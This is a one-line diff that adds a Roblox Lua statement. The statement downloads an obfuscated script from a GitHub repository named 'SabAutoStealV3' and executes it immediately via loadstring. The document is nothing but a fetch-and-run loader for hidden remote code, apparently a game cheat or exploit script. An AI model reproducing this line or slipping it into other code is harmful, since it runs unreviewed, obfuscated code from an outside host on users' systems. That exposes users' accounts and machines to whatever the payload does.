@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SabAutoStealV3/Bobo/refs/heads/main/script.obfuscated-2.lua%20(2).txt", true))()
